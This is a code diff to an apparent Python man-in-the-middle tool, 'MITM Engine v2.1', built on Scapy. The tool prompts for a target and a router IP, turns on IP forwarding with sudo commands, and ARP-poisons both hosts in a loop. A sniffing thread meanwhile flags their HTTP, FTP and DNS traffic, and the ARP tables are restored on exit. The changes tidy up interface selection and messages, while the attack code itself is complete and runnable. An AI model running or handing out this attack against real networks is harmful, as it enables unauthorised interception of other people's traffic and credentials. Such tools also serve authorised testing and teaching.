@@ -9,20 +9,35 @@ from core.ui import draw_header
 console = Console()
 
 def get_interfaces():
-    """Lists available network interfaces for selection."""
-    interfaces = []
-    # Scapy's internal interface list provides reliable cross-platform names
-    for iface in conf.ifaces.data.values():
-        interfaces.append(iface.name)
-    return interfaces
+    """
+    Filters for primary physical interfaces (Wi-Fi and Ethernet).
+    Targets: wlan, wl (Linux), en (macOS/Ethernet), and eth.
+    """
+    all_ifaces = conf.ifaces.data.values()
+    filtered = []
+    
+    # Common prefixes for physical hardware
+    physical_prefixes = ('wlan', 'wl', 'en', 'eth')
+    # Interfaces to ignore (virtual/internal)
+    ignore_list = ('lo', 'utun', 'gif', 'stf', 'bridge', 'anpi', 'awdl', 'llw')
+
+    for iface in all_ifaces:
+        name = iface.name.lower()
+        # Ensure it starts with a physical prefix and isn't in the ignore list
+        if name.startswith(physical_prefixes) and not name.startswith(ignore_list):
+            # Only add if it has an IP address (is active)
+            if iface.ip != "127.0.0.1" and iface.ip != "0.0.0.0":
+                filtered.append(iface.name)
+                
+    return filtered
 
 def toggle_forwarding(state=True):
     """Enables or disables IP forwarding on the host OS."""
     value = 1 if state else 0
     try:
-        if os.uname().sysname == 'Darwin': # macOS
+        if os.uname().sysname == 'Darwin': 
             os.system(f"sudo sysctl -w net.inet.ip.forwarding={value} > /dev/null")
-        else: # Linux
+        else: 
             os.system(f"echo {value} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
     except:
         console.print("[yellow][!] Manual IP forwarding check required.[/yellow]")
@@ -30,7 +45,6 @@ def toggle_forwarding(state=True):
 def get_mac(ip, iface):
     """Resolves MAC address specifically on the chosen interface."""
     try:
-        # We must specify the interface (iface) to resolve MACs on Wi-Fi
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                      timeout=2, verbose=False, iface=iface)
         if ans:
@@ -39,7 +53,7 @@ def get_mac(ip, iface):
         return None
 
 def packet_callback(packet):
-    """Sniffs and displays interesting data from the intercepted stream."""
+    """Sniffs and displays interesting data from the stream."""
     if packet.haslayer(IP):
         if packet.haslayer(TCP):
             port = packet[TCP].dport
@@ -48,23 +62,32 @@ def packet_callback(packet):
             elif port == 21:
                 console.print(f"[bold red][FTP][/bold red] {packet[IP].src} -> {packet[IP].dst}")
         elif packet.haslayer(UDP) and packet[UDP].dport == 53:
-            console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} is querying a domain.")
+            console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} queried a domain.")
 
 def start_mitm():
-    draw_header("MITM Engine v2.1 (WLAN Support)")
+    draw_header("MITM Engine v2.1 (Filtered WLAN)")
     
-    # 1. Interface Selection Logic
+    # 1. Interface Selection with filtering
     ifaces = get_interfaces()
-    table = Table(title="Available Interfaces", border_style="cyan")
+    if not ifaces:
+        console.print("[red][!] No active physical interfaces found.[/red]")
+        return
+
+    table = Table(title="Primary Network Interfaces", border_style="cyan")
     table.add_column("ID", style="bold")
-    table.add_column("Interface Name")
+    table.add_column("Interface", style="white")
+    table.add_column("Status", style="dim")
     
     for i, name in enumerate(ifaces):
-        table.add_row(str(i), name)
+        table.add_row(str(i), name, "[green]ACTIVE[/green]")
     
     console.print(table)
-    iface_id = console.input("[bold yellow]Select Interface ID (Default 0): [/bold yellow]").strip() or "0"
-    chosen_iface = ifaces[int(iface_id)]
+    try:
+        iface_id = console.input("[bold yellow]Select Interface ID: [/bold yellow]").strip()
+        chosen_iface = ifaces[int(iface_id)]
+    except:
+        console.print("[red]Invalid selection.[/red]")
+        return
     
     target = console.input("[bold yellow]Target IP: [/bold yellow]").strip()
     router = console.input("[bold yellow]Router IP: [/bold yellow]").strip()
@@ -76,21 +99,19 @@ def start_mitm():
     r_mac = get_mac(router, chosen_iface)
 
     if not t_mac or not r_mac:
-        console.print("[red]Failure: Could not resolve MAC. Is the target on this interface?[/red]")
+        console.print("[red]Failure: Could not resolve MAC. Check target status.[/red]")
         return
 
     toggle_forwarding(True)
-    
     console.print(f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
     
     stop_event = threading.Event()
-    # Sniffing must be explicitly locked to the chosen interface
     sniff_thread = threading.Thread(target=lambda: sniff(iface=chosen_iface, prn=packet_callback, store=0, stop_filter=lambda p: stop_event.is_set()))
     sniff_thread.start()
 
     try:
         while True:
-            # Poisoning with explicit interface context (iface=chosen_iface)
+            # Poisoning with explicit interface context
             target_packet = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router)
             sendp(target_packet, verbose=False, iface=chosen_iface)
             
@@ -104,11 +125,12 @@ def start_mitm():
         console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
         toggle_forwarding(False)
         
-        restore_target = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router, hwsrc=r_mac)
-        restore_router = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target, hwsrc=t_mac)
+        # Clean Restoration
+        res_target = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router, hwsrc=r_mac)
+        res_router = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target, hwsrc=t_mac)
         
-        sendp(restore_target, count=5, verbose=False, iface=chosen_iface)
-        sendp(restore_router, count=5, verbose=False, iface=chosen_iface)
+        sendp(res_target, count=5, verbose=False, iface=chosen_iface)
+        sendp(res_router, count=5, verbose=False, iface=chosen_iface)
         
-        console.print("[green][+] Network restored. MITM Session Closed.[/green]")
-        input("\nPress Enter to return...")
+        console.print("[green][+] Network restored.[/green]")
+        input("\nPress Enter...")
